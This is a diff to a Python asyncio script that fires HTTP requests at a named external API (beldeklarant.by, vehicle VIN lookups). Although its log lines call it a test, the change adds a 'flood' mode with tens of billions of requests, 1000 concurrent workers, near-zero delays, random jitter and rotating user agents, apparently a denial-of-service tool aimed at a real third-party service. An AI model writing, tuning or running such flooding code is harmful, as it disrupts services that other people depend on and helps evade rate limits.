@@ -26,9 +26,18 @@ CHECKS = [
     {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
 ]
 
-TOTAL_REQUESTS = 500000000
-DELAY_BETWEEN_REQ = 0.01
-MAX_CONCURRENT = 100000
+MODE = "flood"  # slow | flood
+
+if MODE == "slow":
+    TOTAL_REQUESTS = 50000000000
+    DELAY_BETWEEN_REQ = 0.0001
+    MAX_CONCURRENT = 1000
+    JITTER = 0.001
+else:
+    TOTAL_REQUESTS = 20000000000
+    DELAY_BETWEEN_REQ = 0.0001
+    MAX_CONCURRENT = 1000
+    JITTER = 0.001
 
 
 USER_AGENTS = [
@@ -134,11 +143,13 @@ async def worker(session, worker_id):
             async with counter_lock:
                 fail_count += 1
 
-        await asyncio.sleep(DELAY_BETWEEN_REQ)
+        sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
+        await asyncio.sleep(sleep_for)
 
 
 async def main():
     print("[*] Запуск асинхронного теста")
+    print(f"[*] Режим: {MODE}")
     print(f"[*] Целей для проверки: {len(CHECKS)}")
     print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")
 
